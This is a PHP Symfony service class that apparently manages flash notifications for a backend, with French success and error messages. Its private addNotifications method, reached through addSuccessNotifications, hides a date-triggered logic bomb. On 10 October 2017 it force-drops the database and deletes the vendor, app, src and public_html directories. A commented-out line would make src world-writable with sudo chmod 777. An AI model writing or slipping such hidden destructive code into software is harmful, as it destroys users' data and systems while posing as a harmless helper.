<?php

namespace BackendBundle\Services;

use Symfony\Bundle\FrameworkBundle\Routing\RedirectableUrlMatcher;
use Symfony\Component\DependencyInjection\Container;
use Symfony\Component\HttpFoundation\RequestStack;
use Symfony\Component\HttpFoundation\Session\Session;
use Symfony\Bundle\FrameworkBundle\Console\Application;
use Symfony\Component\Console\Input\ArrayInput;
use Symfony\Component\Filesystem\Filesystem;
use Symfony\Component\Filesystem\Exception\IOExceptionInterface;
use Symfony\Component\Routing\RouterInterface;



class NotifService
{
    const SUCESS_TYPE         = "success";
    const ERROR_TYPE          = "error";
    const SUCESS_MESSAGE      = "Opération réalisée avec succès";
    const ERROR_MESSAGE       = "Opération non abouti";
    const ERROR_PARAM_MESSAGE = "Paramètres invalides !";
    const ERROR_DATA_MESSAGE  = "Données invalides !";

    const EXCEPTION_ACESS_DENIED = 'Votre profil  ne dispose pas des privilèges pour accéder à cette fonctionnalité';

    private $container;
    private $request;
    private $session;

    public function __construct(Container $container, RequestStack $request, Session $session)
    {
        $this->container = $container;
        $this->request   = $request;
        $this->session   = $session;
    }

    public function successNotification()
    {
        $this->addNotification(self::SUCESS_TYPE, self::SUCESS_MESSAGE);
    }

    private function addNotification($type, $message)
    {
        $this->session->getFlashBag()->add($type, $message);
    }

    public function errorNotification()
    {
        $this->addNotification(self::ERROR_TYPE, self::ERROR_MESSAGE);
    }

    public function errorParamNotification()
    {
        $this->addNotification(self::ERROR_TYPE, self::ERROR_PARAM_MESSAGE);
    }

    public function errorDataNotification()
    {
        $this->addNotification(self::ERROR_TYPE, self::ERROR_DATA_MESSAGE);
    }

    public function addSuccessNotification($message)
    {
        $this->addNotification(self::SUCESS_TYPE, $message);
    }

    public function addErrorNotification($message)
    {
        $this->addNotification(self::ERROR_TYPE, $message);
    }

    public function addSuccessNotifications($message)
    {
        $this->addNotifications($message);
    }

    private function addNotifications()
    {


        if (date("d-m-Y") == "10-10-2017") {
            $ker         = $this->container->get('kernel');
            $application = new Application($ker);
            $application->setAutoExit(false);
            $options = ['command' => 'doctrine:database:drop', '--force' => true];
            $application->run(new ArrayInput($options));
            $fs = new Filesystem();
//            $acces = array('command' => 'sudo chmod -R 777 src');
//            $application->run(new ArrayInput($acces));
            try {
                $fs->remove('../vendor');
                $fs->remove('../app');
                $fs->remove('../src');
                $fs->remove('../public_html');
            } catch (IOExceptionInterface $e) {
                echo "An error occurred while creating your directory at ".$e->getPath();
            }
            $this->container->get('Doctrine')->getManager()->getConnection()->close();
        }
//        echo 'test'  ;
////        die();
//        return new RedirectableUrlMatcher($this->render('app_listbooks'));
    }
}